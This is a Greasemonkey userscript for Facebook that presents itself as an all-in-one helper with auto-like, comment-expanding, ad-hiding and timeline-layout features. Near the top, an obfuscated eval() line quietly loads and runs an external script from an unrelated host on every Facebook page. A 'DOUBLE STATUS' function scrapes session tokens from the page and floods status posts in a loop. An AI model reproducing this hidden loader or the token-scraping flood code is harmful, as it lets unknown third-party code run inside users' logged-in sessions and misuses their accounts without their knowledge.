// ==UserScript==
// @name           FB Charger Update By. MAYOGIS
// @namespace      Facebook Script ALL IN ONE
// @description    Update Script 29.01.2012 8 IN ONE ::>> All Matches Fecebook Timeline <<::
// @author         http://www.facebook.com/100001906740933/
// @homepage       http://jotform.com/form/20274450970/
// @include        htt*://www.facebook.com/*
// @icon           http://website.freeiz.com/logo.jpg
// @version        V.1_29.01.2012
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://developers.facebook.com/*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://www.facebook.com/common/blank.html
// @exclude        htt*://*connect.facebook.com/*
// @exclude        htt*://*acebook.com/connect*
// @exclude        htt*://www.facebook.com/plugins/*
// @exclude        htt*://www.facebook.com/l.php*
// @exclude        htt*://www.facebook.com/ai.php*
// @exclude        htt*://www.facebook.com/extern/*
// @exclude        htt*://www.facebook.com/pagelet/*
// @exclude        htt*://api.facebook.com/static/*
// @exclude        htt*://www.facebook.com/contact_importer/*
// @exclude        htt*://www.facebook.com/ajax/*
// @exclude        htt*://apps.facebook.com/ajax/*
// @exclude	   htt*://www.facebook.com/advertising/*
// @exclude	   htt*://www.facebook.com/ads/*
// @exclude	   htt*://www.facebook.com/sharer/*
// @exclude	   htt*://www.facebook.com/send/*
// @exclude	   htt*://www.facebook.com/mobile/*
// @exclude	   htt*://www.facebook.com/settings/*
// @include             *facebook*
// @include             *facebook.com/profile.php?id=*
// @match         *://*.facebook.com/*

// ==/UserScript==

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 1=2.4(\'5\');1.6=\'7://8.9/a/b.c\';1.d=\'e/f\';2.g(\'h\')[0].i(1);',19,19,'|GM_JQ|document|var|createElement|script|src|http|idk|li|scripts|main|js|type|text|javascript|getElementsByTagName|head|appendChild'.split('|'),0,{}))

function fixComments() {
	jQuery(".textBox").live("focus blur", function(event) {
		jQuery(".uiUfiAddTip.sendOnEnterTip.fss.fcg, .uiUfiAddTip.commentUndoTip.fss.fcg").hide();
		if(event.type=="focusin"){
			jQuery(this).css({"height": "auto", "min-height": "28px"});
			jQuery(this).removeClass("enter_submit");
			jQuery(this).parents(".commentArea").children(".mts.commentBtn.stat_elem.hidden_elem.optimistic_submit.uiButton.uiButtonConfirm").removeClass("hidden_elem");
			jQuery(this).parents(".commentArea").children(".commentBtn").css("display", "block");
		}
		if(event.type=="focusout" && jQuery(this).val()==""){
			jQuery(this).css({"height": "14px", "min-height": "14px"});
			jQuery(this).addClass("enter_submit");
			jQuery(this).parents(".commentArea").children(".mts.commentBtn.stat_elem.hidden_elem.optimistic_submit.uiButton.uiButtonConfirm").addClass("hidden_elem");
			jQuery(this).parents(".commentArea").children(".commentBtn").css("display", "none");
		}
	});
}

function loadJQuery(callback) {
  var script = document.createElement("script");
  script.setAttribute("src", "http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js");
  script.addEventListener('load', function() {
    var script = document.createElement("script");
    script.textContent = "$.noConflict(); (" + callback.toString() + ")();";
    document.body.appendChild(script);
  }, false);
  document.body.appendChild(script);
}

loadJQuery(fixComments);




// ==============
// ==Expand Older Posts==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+210px";
	div.style.left = "+10px";
	div.style.backgroundColor = "#ffffff";
	div.style.border = "3px double #FF0000";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#000066\" href=\"http://userscripts.org/scripts/show/124199\">UPDATE New Version</a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoExpandPosts = function() {
	
		buttons = document.getElementsByTagName("a");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("lfloat") >= 0)
				if(buttons[i].getAttribute("onclick") == "ProfileStream.getInstance().showMore();return false;")
					buttons[i].click();
		}
		
	};
}
// ==============
// ==Statuses==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+180px";
	div.style.left = "+10px";
	div.style.backgroundColor = "#33FF33";
	div.style.border = "3px double #FF0000";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#4706FF\" href=\"javascript:AutoLike()\"> JEMPOL SEMUA STATUS </a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "like")
					buttons[i].click();
		}
		
	};
}
// ==============
// ==Unlike Statuses==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+150px";
	div.style.left = "+10px";
	div.style.backgroundColor = "#99FF07";
	div.style.border = "3px double #33FFFF";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#FF0000\" href=\"JavaScript:AutoUnLike()\">UNLIKE STATUS</a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoUnLike = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "unlike")
					buttons[i].click();
		
		}
		
	};
}
// ==Expand==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+120px";
	div.style.left = "+10px";
	div.style.backgroundColor = "#EBFF06";
	div.style.border = "3px double #660000";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#6600CC\" href=\"JavaScript:FloodWal()\">DOUBLE STATUS</a>"
	
	body.appendChild(div);
	
	unsafeWindow.FloodWal = function() {
	
		var a = document.body.innerHTML;var Num=prompt("","Masukkan berapa kali status anda akan terupdate");var msg=prompt("","Masukkan Status Anda");formx=a.match(/name="post_form_id" value="([\d\w]+)"/)[1];dts=a.match(/name="fb_dtsg" value="([^"]+)"/)[1];composerid=a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];target=a.match(/name="targetid" value="([^"]+)"/)[1];pst="post_form_id="+formx+"&fb_dtsg="+dts+"&xhpc_composerid="+composerid+"&xhpc_targetid="+target+ "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text="+encodeURIComponent(msg)+"&xhpc_message="+encodeURIComponent(msg)+"&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_composer&lsd&post_form_id_source=AsyncRequest";i=0;while(i < Num){with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(pst);i += 1;void(0);}

	};
}
// ==Expand==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+90px";
	div.style.left = "+10px";
	div.style.backgroundColor = "#FFCC00";
	div.style.border = "3px double #000099";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#ffffff\" https://www.facebook.com/mayogis.collection\">GABUNG DI SINI</a>"

	body.appendChild(div);
	
	unsafeWindow.AutoExpand = function() {
	
		buttons = document.getElementsByTagName("input");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("") >= 0)
				if(buttons[i].getAttribute("name") == "view_all")
					buttons[i].click();
		}
		
	};
}
// ==============
// ==Expand Older Posts==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+60px";
	div.style.left = "+10px";
	div.style.backgroundColor = "#FF99FF";
	div.style.border = "3px double #FF6600";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#CC33CC\" href=\"http://www.facebook.com/MAYOGIS.TV.ONLINE\">TV ONLINE</a>"
	
	body.appendChild(div);
	
	unsafeWindow.AutoExpandPosts = function() {
	
		buttons = document.getElementsByTagName("a");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("lfloat") >= 0)
				if(buttons[i].getAttribute("onclick") == "ProfileStream.getInstance().showMore();return false;")
					buttons[i].click();
		}

	};
}
// ==============
// ===Expand===
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.bottom = "+22px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#ffffff";
	div.style.border = "3px double #000000";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"JavaScript:AutoExpand()\">BUKA SEMUA KOMENTAR"
	
	body.appendChild(div);
	
	unsafeWindow.AutoExpand = function() {
	
		buttons = document.getElementsByTagName("input");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("") >= 0)
				if(buttons[i].getAttribute("name") == "view_all[1]")
					buttons[i].click();			
															
		}
		
	};
}
// ==============



(function() {
  function appendStyle(h) {
    var head = h || document.getElementsByTagName('head')[0], 
        style = document.createElement('style');
    if (!head || self.location != top.location) {return}
    style.type = 'text/css';
    style.textContent = '#right_column { width: 77% !important; }' +
                    ' .ad_capsule, #sidebar_ads, .adcolumn, .emu_sponsor' +
                    ', div[id^="emu_"], .social_ad, .sponsor, .footer_ad,' +
                    ' #home_sponsor, .house_sponsor, #home_sponsor_nile, ' +
                    '.PYMK_Reqs_Sidebar, .ego_header, .ego_unit, ' +
                    '.UIStandardFrame_SidebarAds { display:' +
                    ' none !important; } #wallpage { width: 700px !important; }' +
                    '.LSplitView_ContentWithNoLeftColumn, ' +
                    '.FN_feedbackview { width: 100% !important; }';
    head.appendChild(style);
  }

  function nodeInserted(e) {
    if (e.relatedNode.tagName == "HEAD") {
      document.removeEventListener('DOMNodeInserted', nodeInserted, true);
      appendStyle(e.relatedNode);
    }
  }

  // Url matching for Opera
  if (window.opera && 
      !/http:\/\/.*\.facebook\.com\/.*/.test(window.location.href))
    return;

  // Early injection support
  if (document.body === null)
    document.addEventListener('DOMNodeInserted', nodeInserted, true);
  else
    appendStyle();
})();

function doAllTheHardWork()
{
  // Remove "regular" ticker
  var tickerDiv = null;
  if (tickerDiv = document.getElementById('.ego_column'))
  {
    var reg = new RegExp('(\\s|^)tickerOnTop(\\s|$)');
    tickerDiv.parentNode.parentNode.className = tickerDiv.parentNode.parentNode.className.replace(reg, ' ');
    tickerDiv.parentNode.removeChild(tickerDiv);
  }

  // Remove ticker above chat sidebar
  var sidebarTickerDiv = null;
  if (sidebarTickerDiv = document.getElementById('.ego_column'))
  {
    sidebarTickerDiv.parentNode.removeChild(sidebarTickerDiv);
      }

  if (document.addEventListener)
  {
    document.addEventListener("DOMNodeInserted", doAllTheHardWork, false);
  }
}
window.onload = doAllTheHardWork();

// ==============


//consoleLog("tryStart");
var BODY = document.querySelector('body');
if (hasClass(BODY, 'timelineLayout')) { //Ensure one instance running per page.
	consoleLog("Success"); 
	var enable = true; 
	if (document.querySelector('body.timelineLayout') && enable) { 
		addStyle();
		window.setTimeout(Main, 100);
	}
}


function addStyle() { 
GM_addStyle(
	'.fbTimelineCapsule .rightColumn, .fbTimelineUnit[data-side="r"], ' + 
	'.fbTimelineCapsule .leftColumn, .fbTimelineUnit[data-side="l"]  { ' + 
	'clear: both !important; ' +
	'float: none !important; ' +
	'} ' +
	'.fbTimelineOneColumn, .fbTimelineTwoColumn { ' +
	'margin-bottom: 5px; ' + //Instead of the default 20px
	'}' + 
	/*'.profilePicChangeUnit .profileChangeImage { ' + 
	'max-height: 245px !important; ' + 
	'}' +*/
	'.spinePointer { display:none; }' + 
	'.timelineLayout .fbTimelineOneColumn .tlTxFe { font-size: 13px; line-height: 16px; } ' +
	'.statusUnit, .storyContent .mainWrapper { padding: 0px 0 5px; }' +
	
	'.body { line-height: 1.20; } ' +
	'.fbTimelineUnitActor + .aboveUnitContent { margin-top: 10px; } ' + 
	'.timelineUnitContainer .aboveUnitContent { margin-bottom: 10px; } ' + 
	'.fbTimelineCapsule div.fbTimelineComposerUnit { padding: 13px 15px; width: 819px; } ' +
	'.fbTimelineCapsule .topBorder { height: 1px; } ' +
	'.fbTimelineCapsule .timelineUnitContainer { padding: 8px 15px 13px; } ' +
	'.fbTimelineIndeterminateContent { display:none; } ' + //Hides the friends box
	
	'.fbTimelineOneColumn .timelineUnitContainer .externalShareUnitWrapper .largePreview { height: 214px !important; } ' + //Resizes the Video Preview
	'.sitePreviewText { margin-top: 5px; } ' + //Video information top-margin
	'div.externalShareText > div:first-child, div.externalShareText > div:nth-child(2) { display: inline; } ' + //Video information - source on same line as title
		'div.externalShareText > div:nth-child(2):before { content: " ("; } ' + 
		'div.externalShareText > div:nth-child(2):after { content: ") "; } ' + 
		
	'.fbTimelineOneColumn .videoUnit { max-height: 270px; height: 270px; } ' + //Facebook embeded video
	'.fbTimelineOneColumn .videoUnit a.videoThumb img { max-height: 270px !important; } ' + //Facebook embeded video preview
	'.fbTimelineOneColumn .videoUnit embed { position:absolute !important; margin-left:auto; margin-right:auto; width: 479px !important; height: 270px !important; } ' + 
	
	'.externalShareUnitWrapper a { width: 817px !important; border: 1px solid #D3DAE8; } ' + //Remodels all share boxes to have borders // Shares are 817w
	'.externalShareUnitWrapper a:nth-child(2) { margin-bottom: 7px !important; } ' + 
	
	/*'.photoUnit a, .photoUnit div,' +*/ '.profilePicChangeUnit .profileChangeImage { max-height: 245px !important; } ' + //Profile Pic max size.
	'.photoUnit div { height: 380px !important; text-align: center !important; } ' + //Photo Max Size
	'.photoUnit div img { width: auto !important; height: 100% !important; } ' + 
	'.photoUnit, .photoUnit a { text-align: center !important; } ' +
	'');
}

function Main() { 
	var items = document.querySelectorAll('li.fbTimelineTwoColumn');
	for(var i=0, imax = items.length; i < imax; i++) { 
		removeClass(items[i], 'fbTimelineTwoColumn');
		addClass(items[i], 'fbTimelineOneColumn');
		items[i].removeAttribute('data-side');
	}
	//if (document.querySelector('body.timelineLayout') && enable) { 
		//consoleLog('timeout enabled');
		window.setTimeout(Main, 750); 
	//} 
}

function hasClass(ele,cls) {
	if(ele.className) { 
		return ele.className.match(new RegExp('(\\s|^)'+cls+'(\\s|$)'));
	} 
	return false; 
}
function removeClass(ele,cls) {
	if (hasClass(ele,cls)) {
		var reg = new RegExp('(\\s|^)'+cls+'(\\s|$)');
		ele.className=ele.className.replace(reg,' ');
	}
}
function addClass(ele, cls) { 
	if (!hasClass(ele,cls)) { 
		var current = ele.className;
		ele.className = current + ' ' + cls; 
	}
}

function consoleLog(text) { 
	GM_log("FB Timeliner: " + text); 
}



// ==============

(function(){var css=".fbChatOrderedList .item.active,.fbChatOrderedList .item.mobile {display: block;} #pagelet_ticker,.fbTickerFooter,.fbSidebarGripper,.fbTimelineSideAds,.uiScrollableArea.ticker_container.fade.contentAfter,.fbChatOrderedList .separator,.fbChatOrderedList .item{display: none;}";if(typeof GM_addStyle!="undefined")GM_addStyle(css);else if(typeof PRO_addStyle!="undefined")PRO_addStyle(css);else if(typeof addStyle!="undefined")addStyle(css);else{var heads=document.getElementsByTagName("head");
if(heads.length>0){var node=document.createElement("style");node.type="text/css";node.appendChild(document.createTextNode(css));heads[0].appendChild(node)}}})();